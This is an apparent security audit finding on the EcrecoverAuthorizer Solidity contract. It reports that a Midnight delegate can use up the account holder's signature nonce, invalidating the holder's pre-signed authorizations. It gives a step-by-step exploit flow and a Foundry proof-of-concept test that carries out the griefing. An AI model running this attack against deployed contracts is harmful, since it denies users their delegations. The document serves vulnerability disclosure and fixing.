### Title
Authorized delegate can consume authorizer's EcrecoverAuthorizer nonce, invalidating pre-signed Authorization messages - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` increments `nonce[authorization.authorizer]` unconditionally at line 26, before verifying the signer. The signer check at lines 33–36 accepts any address that `Midnight.isAuthorized(authorization.authorizer, signer)` returns true for, meaning any delegate Bob authorized by Alice in Midnight can sign and submit an `Authorization` struct with `authorizer=Alice`, consuming Alice's current nonce and permanently invalidating any of Alice's pre-signed messages that carry that nonce value.

### Finding Description

**Exact code path:**

`EcrecoverAuthorizer.setIsAuthorized` (line 24–48):

```
Line 26: require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
...
Line 31: address signer = ecrecover(digest, signature.v, signature.r, signature.s);
Line 33-36: require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) [2](#0-1) 

The nonce is incremented at line 26 before the signer is recovered and validated. The signer check at lines 33–36 explicitly permits any address for which `IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)` is true — i.e., any delegate of the authorizer in the core Midnight contract. [3](#0-2) 

**Exploit flow:**

1. Alice calls `midnight.setIsAuthorized(Bob, true, Alice)` — Bob is now a Midnight-level delegate of Alice.
2. Alice off-chain pre-signs `Authorization(authorizer=Alice, authorized=Dave, isAuthorized=true, nonce=0, deadline=T)` and holds it for later submission.
3. Bob constructs and signs `Authorization(authorizer=Alice, authorized=Charlie, isAuthorized=true, nonce=0, deadline=T')`.
4. Bob (or any relayer) calls `ecrecoverAuthorizer.setIsAuthorized(auth_bob, sig_bob)`.
5. Line 26 fires: `nonce[Alice]` is incremented from 0 → 1. The check passes because `authorization.nonce (0) == nonce[Alice] (0)`.
6. Lines 33–36 pass: `signer == Bob`, and `Midnight.isAuthorized(Alice, Bob) == true`.
7. Alice's pre-signed message `(authorizer=Alice, nonce=0)` now reverts with `InvalidNonce` on any future submission attempt.

**Why existing checks fail:**

- The nonce check at line 26 only verifies the nonce value matches and then increments it — it does not restrict *who* may consume it.
- The signer check at lines 33–36 is evaluated *after* the nonce is already consumed; even if it were evaluated first, it still permits authorized delegates.
- The Certora spec `effects` rule verifies that `nonce(authorization.authorizer)` increments by 1 on success, but does not constrain that only the authorizer themselves (not a delegate) may trigger that increment. [4](#0-3) 

### Impact Explanation
Any address that Alice has authorized in Midnight can consume Alice's current `EcrecoverAuthorizer` nonce by signing and submitting an `Authorization` struct with `authorizer=Alice` and the current nonce value. This permanently invalidates all of Alice's pre-signed authorization messages carrying that nonce. Alice must re-sign with the new nonce, but the attacker can repeat the attack indefinitely as long as they remain authorized, creating a sustained DoS on Alice's ability to use pre-signed delegations via `EcrecoverAuthorizer`.

### Likelihood Explanation
**Preconditions:** Alice must have authorized Bob in Midnight (a normal, expected operation). Bob must act adversarially or be compromised. The attack requires no special privileges beyond being an existing Midnight-level delegate of Alice. It is repeatable: after each nonce consumption, Bob can immediately consume the next nonce. No funds are at risk directly, but the DoS is persistent and requires Alice to revoke Bob's Midnight authorization to stop it.

### Recommendation
Restrict nonce consumption to the authorizer only. The signer check should require `signer == authorization.authorizer` unconditionally, removing the delegate path from `EcrecoverAuthorizer.setIsAuthorized`. Delegates who need to act on behalf of an authorizer should do so by calling `Midnight.setIsAuthorized` directly (which already enforces the `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]` check), not through the signature-based path. Alternatively, if delegate signing is intentional, the nonce should be keyed per `(authorizer, signer)` pair rather than per `authorizer` alone, so a delegate's submission does not consume the authorizer's nonce slot. [2](#0-1) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH, IEcrecoverAuthorizer}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract NonceGriefTest is BaseTest {
    function testDelegateConsumesAuthorizerNonce() public {
        // Setup: Alice (borrower) authorizes EcrecoverAuthorizer in Midnight
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);

        // Setup: Alice authorizes Bob (lender) in Midnight — normal delegation
        vm.prank(borrower);
        midnight.setIsAuthorized(lender, true, borrower);

        // Alice pre-signs Authorization(authorizer=Alice, authorized=Dave, nonce=0)
        Authorization memory aliceAuth = Authorization({
            authorizer: borrower,
            authorized: otherBorrower, // Dave
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, aliceAuth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[borrower], digest);
        Signature memory aliceSig = Signature({v: v, r: r, s: s});

        // Bob (lender) signs Authorization(authorizer=Alice, authorized=Charlie, nonce=0)
        Authorization memory bobAuth = Authorization({
            authorizer: borrower,   // Alice's nonce is consumed
            authorized: otherLender, // Charlie
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });
        structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, bobAuth));
        digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (v, r, s) = vm.sign(privateKey[lender], digest); // Bob signs
        Signature memory bobSig = Signature({v: v, r: r, s: s});

        // Bob submits his signed message — consumes Alice's nonce=0
        ecrecoverAuthorizer.setIsAuthorized(bobAuth, bobSig);
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1); // Alice's nonce burned

        // Alice's pre-signed message with nonce=0 now reverts
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(aliceAuth, aliceSig);
    }
}
```

**Expected assertions:**
- `ecrecoverAuthorizer.nonce(borrower) == 1` after Bob's submission.
- Alice's pre-signed `(authorizer=Alice, nonce=0)` reverts with `InvalidNonce`.
- `midnight.isAuthorized(borrower, otherBorrower) == false` — Alice's intended delegation never executed.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L26-26)
```text
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L33-36)
```text
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** certora/specs/EcrecoverAuthorizer.spec (L12-21)
```text
rule effects(env e, EcrecoverAuthorizer.Authorization authorization, EcrecoverAuthorizer.Signature signature, address other) {
    require other != authorization.authorizer;
    uint256 nonceBefore = nonce(authorization.authorizer);
    uint256 otherNonceBefore = nonce(other);

    setIsAuthorized(e, authorization, signature);

    assert nonce(authorization.authorizer) == nonceBefore + 1;
    assert nonce(other) == otherNonceBefore;
}
```
